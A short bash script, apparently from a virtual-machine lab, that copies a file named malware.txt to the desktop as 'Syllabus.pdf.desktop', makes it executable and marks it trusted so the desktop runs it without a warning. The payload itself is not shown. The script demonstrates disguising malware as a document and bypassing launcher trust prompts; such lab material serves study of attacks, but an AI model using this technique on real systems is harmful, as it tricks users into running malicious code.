#!/bin/bash

cd /media/sf_Project

touch ~/Desktop/Syllabus.pdf.desktop
cp malware.txt ~/Desktop/Syllabus.pdf.desktop
chmod +x ~/Desktop/Syllabus.pdf.desktop
gio set ~/Desktop/Syllabus.pdf.desktop "metadata::trusted" yes
